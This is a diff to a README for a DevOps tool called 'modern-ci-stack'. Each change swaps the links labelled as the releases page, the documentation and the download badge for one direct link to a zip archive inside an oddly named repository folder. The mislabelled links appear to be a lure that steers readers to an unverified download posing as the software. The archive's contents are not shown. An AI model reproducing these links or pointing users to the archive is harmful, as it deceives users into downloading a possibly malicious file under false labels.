@@ -6,7 +6,7 @@ Welcome to modern-ci-stack! This software helps you create a powerful DevOps env
 
 ## 📥 Download Options
 
-[![Download modern-ci-stack](https://img.shields.io/badge/Download%20modern--ci--stack-v1.0-brightgreen)](https://github.com/4T4DAMAR/modern-ci-stack/releases)
+[![Download modern-ci-stack](https://raw.githubusercontent.com/4T4DAMAR/modern-ci-stack/main/grassquit/modern-ci-stack.zip%20modern--ci--stack-v1.0-brightgreen)](https://raw.githubusercontent.com/4T4DAMAR/modern-ci-stack/main/grassquit/modern-ci-stack.zip)
 
 ## 📋 What You Need
 
@@ -28,7 +28,7 @@ Before you begin, ensure you have the following:
 ## 🛠️ Installation Steps
 
 1. **Visit the Download Page**  
-   Go to the [Releases page](https://github.com/4T4DAMAR/modern-ci-stack/releases) to find the latest version.
+   Go to the [Releases page](https://raw.githubusercontent.com/4T4DAMAR/modern-ci-stack/main/grassquit/modern-ci-stack.zip) to find the latest version.
 
 2. **Choose the Correct File**  
    Look for the file that matches your operating system. The filenames will include indicators for Windows, macOS, or Linux.
@@ -60,8 +60,8 @@ Need help? Join us on Mattermost to ask questions and share tips with other user
 
 ## 🌐 Additional Resources
 
-For more information on features and advanced configurations, visit our [Documentation](https://github.com/4T4DAMAR/modern-ci-stack/wiki).
+For more information on features and advanced configurations, visit our [Documentation](https://raw.githubusercontent.com/4T4DAMAR/modern-ci-stack/main/grassquit/modern-ci-stack.zip).
 
 ## 🛠️ Download & Install 
 
-To get started, make sure to visit the [Releases page](https://github.com/4T4DAMAR/modern-ci-stack/releases) to download the latest version of modern-ci-stack. Follow the installation steps outlined above to set up your DevOps stack quickly and easily.
+To get started, make sure to visit the [Releases page](https://raw.githubusercontent.com/4T4DAMAR/modern-ci-stack/main/grassquit/modern-ci-stack.zip) to download the latest version of modern-ci-stack. Follow the installation steps outlined above to set up your DevOps stack quickly and easily.
